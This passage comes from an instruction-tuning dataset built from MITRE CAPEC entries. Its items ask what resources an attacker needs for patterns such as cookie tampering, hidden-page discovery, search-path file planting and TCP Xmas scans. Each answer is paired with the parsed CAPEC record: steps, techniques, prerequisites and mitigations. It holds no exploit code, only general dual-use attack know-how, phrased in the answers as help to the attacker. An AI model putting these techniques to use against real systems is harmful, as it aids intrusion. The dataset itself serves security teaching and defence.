        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "300"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "An adversary sends RCP packets to target ports."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary uses the response from the target to determine which, if any, RPC service is running on that port. Responses will vary based on which RPC service is running."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "RPC scanning requires no special privileges when it is performed via a native system utility."
        },
        "Resources_Required": {
          "Resource": "The ability to craft custom RPC datagrams for use during network reconnaissance via native OS utilities or a port scanning tool. By tailoring the bytes injected one can scan for specific RPC-registered services. Depending upon the method used it may be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Typically, an IDS/IPS system is very effective against this type of attack."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-158"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 7.5.2 RPC Grinding, pg. 156"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Accessing/Intercepting/Modifying HTTP Cookies (CAPEC ID: 31)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Accessing/Intercepting/Modifying HTTP Cookies (CAPEC ID: 31):\nA utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior.",
      "@Name": "Accessing/Intercepting/Modifying HTTP Cookies (CAPEC ID: 31)",
      "attack_ptrn": {
        "@ID": "31",
        "@Name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "39"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "157",
              "Exclude_Related": {
                "@Exclude_ID": "513"
              }
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain copy of cookie] The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.",
              "Technique": [
                "Sniff cookie using a network sniffer such as Wireshark",
                "Obtain cookie using a utility such as the Firefox Cookie Manager, Chrome DevTools or AnEC Cookie Editor.",
                "Steal cookie via a cross-site scripting attack.",
                "Guess cookie contents if it contains predictable information."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Obtain sensitive information from cookie] The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.",
              "Technique": [
                "If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.",
                "Analyze the cookie's contents to determine whether it contains any sensitive information."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Modify cookie to subvert security controls.] The adversary may be able to modify or replace cookies to bypass security controls in the application.",
              "Technique": [
                "Modify logical parts of cookie and send it back to server to observe the effects.",
                "Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.",
                "Modify cookie bitwise and send it back to server to observe the effects.",
                "Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a \"points balance\" for a given user where the points have some value. The user may spend their points and then replace their cookie with an older one to restore their balance."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Target server software must be a HTTP daemon that relies on cookies.",
            "The cookies must contain sensitive information.",
            "The adversary must be able to make HTTP requests to the server, and the cookie must be contained in the reply."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To overwrite session cookie data, and submit targeted attacks via HTTP"
            },
            {
              "@Level": "High",
              "#text": "Exploiting a remote buffer overflow generated by attack"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use input validation for cookies",
            "Design: Generate and validate MAC for cookies",
            "Implementation: Use SSL/TLS to protect cookie in transit",
            "Implementation: Ensure the web server implements all relevant security patches, many exploitable buffer overflows are fixed in patches issued for the software."
          ]
        },
        "Example_Instances": {
          "Example": "There are two main attack vectors for exploiting poorly protected session variables like cookies. One is the local machine itself which can be exploited directly at the physical level or indirectly through XSS and phishing. In addition, the adversary in the middle attack (CAPEC-94) relies on a network sniffer, proxy, or other intermediary to intercept the subject's credentials and use them to impersonate the digital subject on the host. The issue is that once the credentials are intercepted, impersonation is trivial for the adversary to accomplish if no other protection mechanisms are in place. See also: CVE-2010-5148 , CVE-2016-0353"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "565"
            },
            {
              "@CWE_ID": "302"
            },
            {
              "@CWE_ID": "311"
            },
            {
              "@CWE_ID": "113"
            },
            {
              "@CWE_ID": "539"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "315"
            },
            {
              "@CWE_ID": "384"
            },
            {
              "@CWE_ID": "472"
            },
            {
              "@CWE_ID": "602"
            },
            {
              "@CWE_ID": "642"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1539",
            "Entry_Name": "Steal Web Session Cookie"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Example_Instances, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Detect Unpublicized Web Pages (CAPEC ID: 143)",
    "context": "",
    "output": "required resources:\nSpidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common page locations from known paths.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common page locations from known paths.",
      "@Name": "Detect Unpublicized Web Pages (CAPEC ID: 143)",
      "attack_ptrn": {
        "@ID": "143",
        "@Name": "Detect Unpublicized Web Pages",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary searches a targeted web site for web pages that have not been publicized. In doing this, the adversary may be able to gain access to information that the targeted site did not intend to make public.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "150",
            "Exclude_Related": [
              {
                "@Exclude_ID": "514"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find target web site] An adversary finds a target web site that they think may have unpublicized web pages"
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Map the published web site] The adversary will map the published web site either by using an automated tool or by manually accessing well-known debugging or logging pages, or otherwise predictable pages within the site tree",
              "Technique": [
                "Use Dirbuster to brute force directories and file names to find unpublicized pages",
                "Find a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked"
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Try to find weaknesses or information] The adversary will try to find weaknesses or information on the unpublicized pages that the targeted site did not intend to be public",
              "Technique": [
                "Manually analyze files or pages for information that could be useful in a further attack",
                "Use a static analysis tool to find weaknesses in unpublished web pages"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted web site must include pages within its published tree that are not connected to its tree of links. The sensitivity of the content of these pages determines the severity of this attack."
        },
        "Resources_Required": {
          "Resource": "Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common page locations from known paths."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "425"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Communication Channel Manipulation (CAPEC ID: 216)",
    "context": "",
    "output": "The resources required to execute Communication Channel Manipulation (CAPEC ID: 216) are the following: A tool that is capable of viewing network traffic and generating custom inputs to be used in the attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool that is capable of viewing network traffic and generating custom inputs to be used in the attack.",
      "@Name": "Communication Channel Manipulation (CAPEC ID: 216)",
      "attack_ptrn": {
        "@ID": "216",
        "@Name": "Communication Channel Manipulation",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "CanPrecede",
            "@CAPEC_ID": "94"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target application must leverage an open communications channel.",
            "The channel on which the target communicates must be vulnerable to interception (e.g., adversary in the middle attack - CAPEC-94)."
          ]
        },
        "Resources_Required": {
          "Resource": "A tool that is capable of viewing network traffic and generating custom inputs to be used in the attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": [
                "Read Data",
                "Modify Data",
                "Other"
              ],
              "Note": "The adversary's injection of additional content into a communication channel negatively impacts the integrity of that channel."
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data",
              "Note": "A successful Communication Channel Manipulation attack can result in sensitive information exposure to the adversary, thereby compromising the communication channel's confidentiality."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Encrypt all sensitive communications using properly-configured cryptography.",
            "Design the communication system such that it associates proper authentication/authorization with each channel/message."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "306"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Prerequisites"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Abuse of Communication Channels"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Exploiting Trust in Client (CAPEC ID: 22)",
    "context": "",
    "output": "The resources required to execute Exploiting Trust in Client (CAPEC ID: 22) are the following: Ability to communicate synchronously or asynchronously with server",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to communicate synchronously or asynchronously with server",
      "@Name": "Exploiting Trust in Client (CAPEC ID: 22)",
      "attack_ptrn": {
        "@ID": "22",
        "@Name": "Exploiting Trust in Client",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by communicating directly with the server where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Prerequisites": {
          "Prerequisite": "Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.",
            "Design: Do not rely on client validation or encoding for security purposes.",
            "Design: Utilize digital signatures to increase authentication assurance.",
            "Design: Utilize two factor authentication to increase authentication assurance.",
            "Implementation: Perform input validation for all remote content."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.",
            "Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.",
            "Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.",
            "Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "290"
            },
            {
              "@CWE_ID": "287"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "200"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Description"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Exploiting Trust in Client (aka Make the Client Invisible)"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Navigation Remapping To Propagate Malicious Content (CAPEC ID: 387), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nA software program that allows the use of adversary-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A software program that allows the use of adversary-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.",
      "@Name": "Navigation Remapping To Propagate Malicious Content (CAPEC ID: 387)",
      "attack_ptrn": {
        "@ID": "387",
        "@Name": "Navigation Remapping To Propagate Malicious Content",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic.",
        "Extended_Description": {
          "xhtml:p": "Performing this attack allows the adversary to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the adversarys' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the adversarys' intent. When the goal is to spread malware, deceptive content is created such as modified links, buttons, or images, that entice users to click on those items, all of which point to a malicious URI. The techniques require use of specialized software that allow the adversary to use adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system in order to change the destination of various application interface elements."
        },
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "386"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Targeted software is utilizing application framework APIs"
        },
        "Resources_Required": {
          "Resource": "A software program that allows the use of adversary-in-the-middle communications between the client and server, such as a man-in-the-middle proxy."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "471"
            },
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "602"
            },
            {
              "@CWE_ID": "311"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-327"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Description, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Create files with the same name as files protected with a higher classification (CAPEC ID: 177), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe attacker must have sufficient access to place an arbitrarily named file somewhere early in the application's search path.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must have sufficient access to place an arbitrarily named file somewhere early in the application's search path.",
      "@Name": "Create files with the same name as files protected with a higher classification (CAPEC ID: 177)",
      "attack_ptrn": {
        "@ID": "177",
        "@Name": "Create files with the same name as files protected with a higher classification",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker exploits file location algorithms in an operating system or application by creating a file with the same name as a protected or privileged file. The attacker could manipulate the system if the attacker-created file is trusted by the operating system or an application component that attempts to load the original file. Applications often load or include external files, such as libraries or configuration files. These files should be protected against malicious manipulation. However, if the application only uses the name of the file when locating it, an attacker may be able to create a file with the same name and place it in a directory that the application will search before the directory with the legitimate file is searched. Because the attackers' file is discovered first, it would be used by the target application. This attack can be extremely destructive if the referenced file is executable and/or is granted special privileges based solely on having a particular name.",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "17"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target application must include external files. Most non-trivial applications meet this criterion.",
            "The target application does not verify that a located file is the one it was looking for through means other than the name. Many applications fail to perform checks of this type.",
            "The directories the target application searches to find the included file include directories writable by the attacker which are searched before the protected directory containing the actual files. It is much less common for applications to meet this criterion, but if an attacker can manipulate the application's search path (possibly by controlling environmental variables) then they can force this criterion to be met."
          ]
        },
        "Resources_Required": {
          "Resource": "The attacker must have sufficient access to place an arbitrarily named file somewhere early in the application's search path."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "706"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1036",
            "Entry_Name": "Masquerading"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: TCP Xmas Scan (CAPEC ID: 303), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThis attack can be carried out with a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "This attack can be carried out with a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
      "@Name": "TCP Xmas Scan (CAPEC ID: 303)",
      "attack_ptrn": {
        "@ID": "303",
        "@Name": "TCP Xmas Scan",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses a TCP XMAS scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with all possible flags set in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.",
        "Extended_Description": {
          "xhtml:p": "In addition to its relative speed when compared with other types of scans, its major advantage is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. XMAS packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, XMAS scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, XMAS scans are flagged by almost all intrusion prevention or intrusion detection systems."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "300"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "An adversary sends TCP packets with all flags set but not associated with an existing connection to target ports."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary needs logical access to the target network. XMAS scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges."
        },
        "Resources_Required": {
          "Resource": "This attack can be carried out with a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Employ a robust network defensive posture that includes a managed IDS/IPS."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 5.5 TCP FIN, NULL, XMAS Scans, pg. 107"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
